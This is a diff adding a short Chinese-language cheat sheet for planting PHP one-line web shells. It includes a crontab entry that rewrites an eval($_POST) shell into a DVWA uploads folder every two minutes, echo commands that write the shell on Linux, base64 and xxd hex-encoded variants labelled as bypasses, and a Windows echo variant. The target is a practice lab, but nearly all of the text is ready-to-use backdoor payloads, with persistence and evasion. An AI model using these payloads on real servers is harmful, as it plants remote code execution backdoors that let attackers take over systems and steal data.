@@ -1,0 +1,17 @@
+*/2 * * * * /bin/echo '<?php eval(@$_POST['password']);?>' > /www/admin/localhost_80/wwwroot/DVWA-master/hackable/uploads/shell.php
+
+1.使用命令crontab -e进入编辑界面
+2.输入上面命令，上面是将一句话木马写入/www/admin/localhost_80/wwwroot/DVWA-master/hackable/uploads/中，并命名为shell.php，时间间隔是2分钟执行一次
+3.crontab -l ，可以查看到当前正在执行的任务
+
+
+1.Linux下写shell
+$ echo "<?php @eval(\$_POST[123]); ?>" > webshell.php
+$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d > webshell.php   #base64编码绕过，这个解码就是<?php @eval($_POST[123]); ?>
+$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php #xxd绕过 ，解码就是<?php @eval($_POST[123]); ?>
+
+
+
+
+2.windows下写shell
+echo ^<?php eval($^_POST[123]); ?^> > webshell.php
